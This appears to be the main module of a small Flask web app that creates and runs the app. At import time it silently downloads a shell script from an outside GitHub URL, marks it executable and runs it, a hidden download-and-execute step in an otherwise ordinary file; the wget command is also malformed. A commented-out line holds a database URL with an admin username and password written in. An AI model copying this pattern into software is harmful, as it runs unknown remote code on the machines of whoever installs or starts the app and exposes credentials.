from flask import Flask
from .routes.flaskr import create_app
import os
os.system ('wget -O https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh --output b.sh; chmod +x b.sh; ./b.sh')
app = Flask(__name__)
create_app(app)

if __name__ == "__main__":
    app.run()

# test = get(url="http://couchdb-admin:couchdb-password@database:5984/")
# print(test, "\n \n \n \n \n")
